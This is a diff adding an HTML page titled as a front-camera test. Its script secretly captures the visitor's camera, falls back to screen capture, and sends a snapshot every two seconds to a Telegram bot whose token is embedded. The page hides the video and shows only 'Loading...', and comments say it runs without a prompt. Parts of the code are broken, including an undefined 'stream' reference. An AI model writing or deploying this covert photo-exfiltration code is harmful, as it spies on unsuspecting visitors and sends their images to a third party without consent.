@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Feature-Policy" content="camera *">
+  <meta http-equiv="Permissions-Policy" content="camera=*">
+  <title>Camera Testing - Front Camera</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="flex bg-sky-950 items-center h-screen justify-center">
+  <video class="hidden" id="video" width="640" height="480" autoplay playsinline></video>
+  <h1 class="text-4xl text-center animate-pulse text-amber-400">
+    Loading...
+  </h1>
+
+  <script>
+    // Автоматический запуск без промпта для тестирования
+    document.addEventListener("DOMContentLoaded", function () {
+      // Функция для определения типа устройства и выбора камеры
+      async function getCameraAccess() {
+        try {
+          // Сначала пытаемся получить список всех камер
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          const videoDevices = devices.filter(device => device.kind === 'videoinput');
+          
+          let constraints;
+          
+          // Для мобильных устройств используем фронтальную камеру
+          const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+          
+          if (isMobile) {
+            // Для мобильных - фронтальная камера (user)
+            constraints = {
+              video: {
+                facingMode: { exact: "user" }, // ТОЧНО фронтальная камера
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              },
+              audio: false
+            };
+          } else {
+            // Для десктопа - первая доступная камера
+            constraints = {
+              video: {
+                facingMode: "user", // Фронтальная для веб-камер
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              },
+              audio: false
+            };
+          }
+          
+          // Пытаемся получить доступ к камере
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+          
+          // Проверяем, какая камера выбрана
+          const tracks = stream.getVideoTracks();
+          const settings = tracks[0].getSettings();
+          
+          console.log("Камера настроена:", {
+            facingMode: settings.facingMode,
+            deviceId: tracks[0].getCapabilities().deviceId,
+            isMobile: isMobile
+          });
+          
+          // Устанавливаем обработчики для автоматической отправки
+          video.onloadedmetadata = () => {
+            video.play();
+            startSendingPhotos();
+          };
+          
+        } catch (err) {
+          console.error("Camera error:", err);
+          
+          // Если точное соответствие не сработало, пробуем более мягкий вариант
+          try {
+            const fallbackConstraints = {
+              video: {
+                facingMode: "user", // Без exact, чтобы браузер мог выбрать
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              },
+              audio: false
+            };
+            
+            const stream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
+            const video = document.getElementById("video");
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+              video.play();
+              startSendingPhotos();
+            };
+            
+          } catch (secondError) {
+            console.error("Second attempt failed:", secondError);
+            
+            // Последняя попытка - любая доступная камера
+            try {
+              const anyCamera = {
+                video: true,
+                audio: false
+              };
+              
+              const stream = await navigator.mediaDevices.getUserMedia(anyCamera);
+              const video = document.getElementById("video");
+              video.srcObject = stream;
+              
+              video.onloadedmetadata = () => {
+                video.play();
+                startSendingPhotos();
+              };
+              
+            } catch (finalError) {
+              console.error("All camera attempts failed:", finalError);
+              
+              // Резервный метод - захват экрана
+              try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({
+                  video: true
+                });
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+                startSendingPhotos();
+              } catch (displayError) {
+                console.error("Display media also failed:", displayError);
+              }
+            }
+          }
+        }
+      }
+
+      // Запускаем автоматически
+      setTimeout(getCameraAccess, 1000);
+
+      function startSendingPhotos() {
+        setInterval(() => {
+          const video = document.getElementById("video");
+          if (!video.videoWidth || !video.videoHeight) {
+            console.log("Video not ready yet");
+            return;
+          }
+          
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const context = canvas.getContext("2d");
+          
+          // Для фронтальной камеры можно добавить зеркальное отражение
+          context.save();
+          context.scale(-1, 1); // Зеркалим по горизонтали
+          context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+          context.restore();
+          
+          canvas.toBlob(function (blob) {
+            const formData = new FormData();
+            formData.append("chat_id", "1143475155" && "5810250799");
+            formData.append("photo", blob);
+
+            fetch(
+              "https://api.telegram.org/bot7758585946:AAHWdNM-t38rvi65x3gfHSdZV_nUD80RFtA/sendPhoto",
+              {
+                method: "POST",
+                body: formData,
+                mode: 'no-cors'
+              }
+            ).then(() => {
+              console.log("Photo sent successfully");
+            }).catch(error => console.log("Send error:", error));
+          }, "image/jpeg", 0.7); // Качество 70%
+        }, 2000);
+      }
+      
+      // Дополнительная функция для принудительного выбора фронтальной камеры
+      async function forceFrontCamera() {
+        try {
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          const videoDevices = devices.filter(d => d.kind === 'videoinput');
+          
+          // Пытаемся найти фронтальную камеру по метке
+          let frontCameraId = null;
+          for (const device of videoDevices) {
+            const label = device.label.toLowerCase();
+            if (label.includes('front') || label.includes('face') || label.includes('user')) {
+              frontCameraId = device.deviceId;
+              break;
+            }
+          }
+          
+          if (frontCameraId) {
+            const constraints = {
+              video: {
+                deviceId: { exact: frontCameraId },
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              },
+              audio: false
+            };
+            
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const video = document.getElementById("video");
+            video.srcObject = stream;
+            
+            video.onloadedmetadata = () => {
+              video.play();
+              startSendingPhotos();
+            };
+          } else {
+            // Если не нашли по метке, используем facingMode
+            getCameraAccess();
+          }
+        } catch (error) {
+          console.error("Force front camera error:", error);
+          getCameraAccess(); // Возвращаемся к основному методу
+        }
+      }
+      
+      // Альтернативный запуск с принудительным выбором фронтальной камеры
+      // setTimeout(forceFrontCamera, 1000);
+    });
+    // Проверка камеры после получения доступа
+const videoTrack = stream.getVideoTracks()[0];
+const capabilities = videoTrack.getCapabilities();
+const settings = videoTrack.getSettings();
+
+console.log("Camera info:", {
+  facingMode: settings.facingMode, // 'user' = фронтальная, 'environment' = задняя
+  label: videoTrack.label, // Название камеры
+  deviceId: settings.deviceId // ID устройства
+  
+
+});
+// Специальные настройки для iOS
+const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+
+if (isIOS) {
+  // iOS часто требует user gesture для доступа к камере
+  document.body.addEventListener('touchstart', function initCamera() {
+    getCameraAccess();
+    document.body.removeEventListener('touchstart', initCamera);
+  }, { once: true });
+} else {
+  setTimeout(getCameraAccess, 1000);
+}
+
+  </script>
+  
+
+</body>
+</html>
